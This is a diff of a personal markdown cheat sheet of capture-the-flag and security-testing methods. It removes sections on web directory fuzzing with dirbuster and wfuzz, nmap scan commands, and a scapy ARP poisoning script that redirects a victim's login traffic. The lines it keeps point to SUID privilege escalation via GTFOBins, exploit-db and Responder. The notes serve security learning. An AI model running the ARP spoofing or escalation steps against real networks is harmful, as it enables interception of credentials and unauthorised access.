@@ -2,13 +2,9 @@
 title: General
 ---
 
-## Subfolders
-I have included a small selection of challenges and how to solve them in the subfolders. Below is a list of general methods/notes for myself 
-
 ## Crypto
 `dcode` is a very useful tool for decrypting various ciphers.
 `pycrptodome` is a successor of the no longer mained `pycrypto`
-
 
 ### DH
 
@@ -75,23 +71,6 @@ else:
 - use https://gtfobins.github.io to find instructions how to exploit this binary
 - find SUID bit set using "find / -perm -4000 -type f 2>/dev/null"
 
-## Web
-`Burp Suite` GUI tool to execute/modify HTTP requests
-`requests` (python) sending requests in any format
-`nikto` (https://github.com/sullo/nikto) for web server scanner
-`bbot` (https://github.com/blacklanternsecurity/bbot) for web server scanner
-
-### Finding hidden files/directories
-
-```bash
-docker run --rm hypnza/dirbuster -u https://website.com
-```
-
-Or with a [wordlist](https://github.com/xmendez/wfuzz/tree/master/wordlist):
-```bash
-docker run -v $(pwd)/wordlist:/wordlist/ -it ghcr.io/xmendez/wfuzz wfuzz -c -z file,/wordlist/list.txt --hc 404 https://website.com/FUZZ
-```
-
 ## Reverse Engineering
 `IDA Free` (statically) analyze binaries
 `Ghidra` (statically) analyze programs
@@ -117,47 +96,5 @@ The binary operates with both a real user ID (UID) and an effective user ID (EUI
 ## CVE's
 Find CVE's on https://www.exploit-db.com/
 
-## ARP poisoning
-
-Suppose victim (IP_V, MAC_V) is logging into a http website that is hosted on (IP_W, MAC_W)
-
-Our goal is to trick the victim that the MAC address of the website is our own computer (MAC_O) MAC address, such that the login requests go to our computer instead of to the website.
-
-We can do this using ARP poisoning, we send ARP "responses" to the victim, that say that MAC_O belongs to IP_W.
-
-We can do this using scapy:
-
-```
-spoofed = eval("Ether(dst='MAC_V', src='MAC_O', type=2054)/ARP(hwtype=1, ptype=2048, hwlen=6, plen=4, op=2, hwsrc='MAC_O', psrc='IP_W', hwdst='MAC_V', pdst='IP_V')")
-sendp(spoofed,iface="eth0",loop=1,inter=0.1)
-```
-
-The MAC addresses MAC_V, MAC_W can be found using:
-
-```
-from scapy.all import ARP, Ether, srp, conf
-
-conf.verb = 0  # quiet
-iface = "eth0"  # change interface
-network = "192.168.0.0/24" # change subnet
-
-arp = ARP(pdst=network)
-eth = Ether(dst="ff:ff:ff:ff:ff:ff")
-ans, _ = srp(eth/arp, iface=iface, timeout=2)
-
-for snd, rcv in ans:
-    print(f"{rcv.psrc} is at {rcv.hwsrc}")
-```
-
-And our own MAC address can be found using
-```
-ip a show eth0
-```
-
 ## Other
-`nmap -O ip` simple scan
-`nmap -sT ip` simple TCP scan
-`nmap -sU ip` simple UDP scan
-`nmap --top-ports 1000 ip` scan top used ports
-`nmap -n -PN -sT -sU -p- ip` scan for all tcp and udp ports
 `Responder` for poisoning (faking "auth server")
